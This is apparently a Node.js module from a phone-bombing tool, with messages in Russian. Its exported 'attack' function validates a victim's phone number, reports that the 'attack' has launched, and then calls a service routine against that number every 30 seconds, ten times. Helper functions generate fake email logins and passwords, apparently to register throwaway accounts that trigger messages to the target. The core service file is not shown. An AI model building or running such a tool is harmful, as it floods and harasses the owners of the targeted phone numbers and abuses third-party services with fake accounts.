const service = require("./services/core.js")

module.exports.attack = function(number, loop){
/**/
    if(!Number(number) || number.length < 11){
            result = {
                "success": false,
                "text": `Указанный параментр number не является номером телефона либо вовсе не указан`
            }
        return result; 
    }
    if(!Number(loop)){
        result = {
            "success": false,
            "text": `Указанный параментр loop не является корректным либо вовсе отсутстует`
        }
        return result; 
    }else{
        result = {
            "success": true,
            "text": `Атака на номер ${number} успешно запущена`
        }
	count = 0;
	interval = setInterval(async function(){
      service.start(number)
        	count++;
            	if(count == 10){
            		clearInterval(interval);
            	}
		}, 30000);
    }
        return result;
}

function mailGen(){
    let domains = ['@mail.ru', '@yandex.ru', '@gmail.com', '@rambler.ru']
    let fakelogin = Math.random().toString(36).substr(5, 9)
    let result = fakelogin + getRandomElement(domains)
    return result
}

function passGen(){
    let chars = ['!', '@', '#', '$']
    let fakepass = Math.random().toString(36).substr(5, 9)
    let result = fakepass + getRandomElement(chars)
    return result
}

function rand(min, max){
	return Math.round(Math.random() * (max - min)) + min
}   

function getRandomElement(arr) {
    var rand = Math.floor(Math.random() * arr.length);
    return arr[rand];
}
